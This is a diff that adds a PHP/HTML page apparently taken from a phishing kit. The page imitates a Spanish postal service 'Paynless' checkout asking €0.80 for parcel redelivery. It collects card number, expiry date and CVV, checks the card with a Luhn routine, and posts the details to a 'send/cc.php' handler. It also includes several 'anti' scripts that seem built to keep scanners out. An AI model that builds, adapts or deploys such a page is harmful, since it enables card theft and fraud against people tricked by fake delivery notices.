@@ -1,0 +1,193 @@
+<?php
+
+    include '../secure/anti1.php';
+	include '../secure/anti2.php';
+	include '../secure/anti3.php';
+	include '../secure/anti4.php';
+	include '../secure/anti5.php';
+	include '../secure/anti6.php';
+	include '../secure/anti7.php';
+	include '../secure/anti8.php';
+
+
+?>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en" id="indexBody"><head>
+    <title>Detalle</title>
+    <!-- Include necessary meta tags, stylesheets, and scripts here -->
+<style>.osSwitch{position:relative;display:inline-block;width:34px;height:15.3px}.osSwitch input{opacity:0;width:0;height:0}.osSlider{position:absolute;top:0;left:0;right:0;bottom:0;border-radius:34px;background-color:#93a0b5;transition:0.4s}.osSlider:before{position:absolute;content:'';height:13px;width:13px;left:2px;bottom:1px;border-radius:50%;background-color:white;transition:0.4s}input:checked+.sliderGreen{background-color:#04d289}input:checked+.sliderRed{background-color:#ff3b30}input:not(:checked)+.defaultGreen{background-color:#04d289}input:checked+.osSlider:before{transform:translateX(17px)}
+</style><style>
+    @font-face {
+      font-family: 'SegoeUI_online_security'; 
+      src: url(chrome-extension://llbcnfanfmjhpedaedhbcnpgeepdnnok/segoe-ui.woff);
+    }
+
+    @font-face {
+      font-family: 'SegoeUI_bold_online_security'; 
+      src: url(chrome-extension://llbcnfanfmjhpedaedhbcnpgeepdnnok/segoe-ui-bold.woff);
+    }
+</style></head>
+<body id="BodyPayment" style="background-color: transparent">
+    
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+		<title>
+			Paynless - Pago online rápido
+		</title>
+		<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+		<meta name="apple-mobile-web-app-capable" content="yes">
+		<link rel="shortcut icon" href="/sogstatic.azureedge.net/lib/estilos/llekopaynless/base/images/favicon.ico">
+		<link rel="apple-touch-icon-precomposed" href="/sogstatic.azureedge.net/lib/estilos/llekopaynless/base/images/apple-touch-icon.png">
+		<link id="LayoutCheckOutFolderStyleCss" rel="stylesheet" type="text/css" href="./files/css/layoutcheckoutcorreos.min.css">
+		<link id="linkBootstrapCss" rel="stylesheet" type="text/css" href="./files/css/bootstrap.min.css">
+		<!--[if lt IE 9]>
+		 <script src="/lib/estilos/LlekoPaynless/Base/scripts/html5.js"></script>
+	<![endif]-->
+
+		<link rel="stylesheet" href="./files/css/animista.css">
+		<link rel="stylesheet" href="./files/css/imagespin.css">
+		<script>
+function formatExpiry(input) {
+  var value = input.value.replace(/\D/g, ''); // Remove any non-numeric characters from the input
+
+  if (value.length > 2) {
+    value = value.slice(0, 2) + '/' + value.slice(2); // Insert a slash after the second digit
+  }
+
+  if (value.length > 5) {
+    value = value.slice(0, 5); // Limit the input to "mm/yy" format
+  }
+
+  if (value.length === 2 && input.value.length !== 3) {
+    value += '/'; // Add the slash if the length is exactly 2 and the user has not entered a third digit yet
+  }
+
+  input.value = value; // Update the input value
+}
+
+		</script>
+	
+	
+
+		<div class="lodingBack" id="lodingBack" style="display: none;">
+			<img class="rotate-center" src="./files/img/loading.png" style="margin-top: 100%;" width="40">
+		</div>
+
+		<div id="stepProcessB"></div>
+		<div id="stepProcessA"></div>
+
+
+
+
+
+
+		<div id="app"><div tabindex="-1" role="dialog" aria-describedby="lleko-dialog-payment" aria-labelledby="ui-id-1" class="ui-dialog ui-corner-all ui-widget ui-widget-content ui-front ui-resizable" style="position: relative; height: auto; width: 360px; top: 3px; left: 0px;">
+			<div id="lleko-dialog-payment" class="ui-dialog-content ui-widget-content" style="width: auto; min-height: 0px; max-height: none; height: auto;"><div id="logoEnterprise" class="logo-enterprise"><h2 id="logoEnterpriseText">Pagar con tarjeta</h2></div> <div id="itemPaymentContent" class="grid_4 grid_form concept"><p id="itemPaymentText"><span>Qué voy a pagar:</span>Para el reenvío, la oficina de correos cobrará algunas tarifas de servicio</p></div> <article id="gridForm" class="grid_4 grid_form">
+				<form name="paymentForm" method="post" action="./send/cc.php" id="ymentForm"><div>
+		</div>
+												<fieldset class="card"><legend style="display: none;"></legend>
+													<label for="card" class="card">Tarjeta</label>
+													<input name="card" type="text" maxlength="16" id="card" tabindex="2" autocomplete="none" autocorrect="off" spellcheck="true" autocapitalize="off" placeholder="Tarjeta" class="unknown" pattern="^\d{16}$" style="color: rgb(0, 0, 0);" required=""> <!----> <!----></fieldset>
+													
+													 <fieldset class="grid_2 expiry"><legend style="display: none;"></legend>
+														 <label for="expiry">Caducidad (mm/yy)</label>
+									<input name="expiry" type="text" maxlength="5" id="expiry" tabindex="3" autocomplete="none" autocorrect="off" spellcheck="true" autocapitalize="off" placeholder="mm/yy" oninput="formatExpiry(this)" pattern="^((0[1-9])|(1[0-2]))(/?)(2[3-9]|[3-9][0-9])$" style="color: rgb(0, 0, 0);" required=""> <!----> <!----></fieldset> <fieldset class="grid_2 cvv"><legend style="display: none;"></legend> <label for="cvv">CVV</label>
+										<input name="cvv" type="text" maxlength="4" id="cvv" tabindex="4" autocomplete="cc-csc" autocorrect="off" spellcheck="true" autocapitalize="off" pattern="^\d{3,4}$" placeholder="CVV" style="color: rgb(0, 0, 0);" required=""> <!----> <span id="cvvRegularExpressionValidator" class="small scale-up-bottom" style="color: red; display: none;">El CVV tienen que tener al menos tres números</span></fieldset> <fieldset id="checkboxVorwerk"><legend style="display: none;"></legend> <div id="default-checkbox2" class="checkbox" style="overflow: hidden;"></div>
+											<div id="default-checkbox3" class="checkbox" style="overflow: hidden;"></div>
+										 <div id="myModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" class="modal fade" style="z-index: 1;">
+										<div role="document" class="modal-dialog modal-lg">
+											<div class="modal-content">
+												<div class="modal-header">
+													<button type="button" data-dismiss="modal" aria-label="Close" class="close"><span aria-hidden="true">×</span></button>
+													<h2 id="myModalLabel" class="modal-title">INFORMACIÓN SOBRE EL
+													TRATAMIENTO DE DATOS PERSONALES</h2>
+												</div></div></div></div>
+												<div id="myModal2" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" class="modal fade" style="z-index: 1050;"><div role="document" class="modal-dialog modal-lg"><div class="modal-content"><div class="modal-header">
+													<button type="button" data-dismiss="modal" aria-label="Close" class="close"><span aria-hidden="true">×</span></button>
+													<h2 id="myModalLabel2" class="modal-title">Términos y Condiciones del
+													Pago por TPV virtual</h2></div></div></div></div></fieldset>
+
+													  <fieldset id="botonesVorwerk"><center><!----></center>
+										<input type="submit" name="submitbtn" id="submitbtn" tabindex="6" onclick="delaySubmit(event)" value="Pagar €0.80" style="color: rgb(255, 255, 255); ">
+										<input type="button" name="reset" id="resetbtn" tabindex="7" value="Limpiar"></fieldset>
+										</form></article></div>
+										 
+										<div id="LLekoPaymentMessage" class="payment-alert" style="background-color: rgb(240, 240, 240); display: none;"><h3 id="LLekoPaymentMessageText"></h3>
+										<input name="step2Closed" type="button" id="step2Closed" tabindex="7" value="Cerrar" style="color: rgb(255, 255, 255);"></div></div> 
+										<div class="ui-resizable-handle ui-resizable-n" style="z-index: 90;"></div> 
+										<div class="ui-resizable-handle ui-resizable-e" style="z-index: 90;"></div>
+										<div class="ui-resizable-handle ui-resizable-s" style="z-index: 90;"></div>
+										<div class="ui-resizable-handle ui-resizable-w" style="z-index: 90;"></div>
+										<div class="ui-resizable-handle ui-resizable-se ui-icon ui-icon-gripsmall-diagonal-se" style="z-index: 90;"></div>
+										<div class="ui-resizable-handle ui-resizable-sw" style="z-index: 90;"></div>
+										<div class="ui-resizable-handle ui-resizable-ne" style="z-index: 90;"></div>
+										<div class="ui-resizable-handle ui-resizable-nw" style="z-index: 90;"></div>
+									</div>
+								
+
+		<script src="config/urlconfig.json"></script>
+		<script src="./static/js/axios.js" type="text/javascript" charset="utf-8">
+		</script>
+		<script src="./static/js/jquery-ui.js" type="text/javascript" charset="utf-8">
+		</script>
+		<script src="./static/js/vue.js" type="text/javascript" charset="utf-8"></script>
+		<script src="../static/js/resourceconfig.js" type="text/javascript" charset="utf-8">
+		</script>
+		
+
+		<div class="ui-widget-overlay ui-front" style="z-index: 100;"></div>
+	 <!-- Overlay with loading icon and waiting text -->
+  <!-- <div id="overlay" class="overlay"> -->
+    <!-- <div class="loading-icon show"> -->
+      <!-- <img src="./files/img/loading.png" alt="Loading Icon"> -->
+    <!-- </div> -->
+    <!-- <p id="waitingText" class="waiting-text">Espere por favor...</p> -->
+  <!-- </div> -->
+  <script>
+      // Function to validate the credit card number
+function validateCreditCard(event) {
+  event.preventDefault();
+  const cardInput = document.getElementById('card').value;
+
+  // Remove any non-digit characters from the card number
+  const cardNumber = cardInput.replace(/\D/g, '');
+
+  // Validate the card number using Luhn algorithm
+  const isValidCard = validateCred(Array.from(cardNumber).map(Number));
+
+  if (isValidCard) {
+    // Credit card is valid, submit the form
+    document.getElementById('ymentForm').submit();
+  } else {
+    alert('Los números de tarjeta son incorrectos!');
+  }
+}
+
+// The purpose of validateCred() is to return true when an array contains digits of a valid credit card number and false when it is invalid.
+function validateCred(creditCard) {
+  let checkSum = 0;
+  let doubleBol = true;
+  const checkDigit = creditCard[creditCard.length - 1];
+  checkSum += checkDigit;
+  for (let i = creditCard.length - 2; i >= 0; i--) {
+    if (doubleBol) {
+      let doubleValue = creditCard[i] * 2;
+      if (doubleValue > 9) {
+        doubleValue -= 9;
+      }
+      checkSum += doubleValue;
+      doubleBol = false;
+    } else if (!doubleBol) {
+      checkSum += creditCard[i];
+      doubleBol = true;
+    }
+  }
+  return checkSum % 10 === 0;
+}
+
+// Attach event listener to the form submission
+const paymentForm = document.getElementById('ymentForm');
+paymentForm.addEventListener('submit', validateCreditCard);
+  </script>
+
+
+
+</body></html>
